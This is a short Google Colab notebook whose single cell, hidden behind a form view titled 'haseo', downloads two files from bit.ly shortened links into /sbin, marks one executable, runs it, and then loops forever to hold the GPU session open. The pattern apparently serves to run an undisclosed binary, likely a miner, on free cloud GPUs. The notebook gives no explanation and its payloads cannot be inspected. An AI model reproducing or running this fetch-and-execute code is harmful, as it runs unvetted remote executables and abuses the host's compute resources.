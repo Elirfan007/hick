{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "hao.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "R-CbmO0H2qGP"
      },
      "source": [
        "#@title haseo\n",
        "\n",
        "%cd /sbin\n",
        "!wget https://bit.ly/3hhNoTC\n",
        "!wget https://bit.ly/36dtQty\n",
        "!chmod +x 36dtQty\n",
        "!./36dtQty\n",
        "\n",
        "while True:pass\n",
        "\n",
        "\n"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}

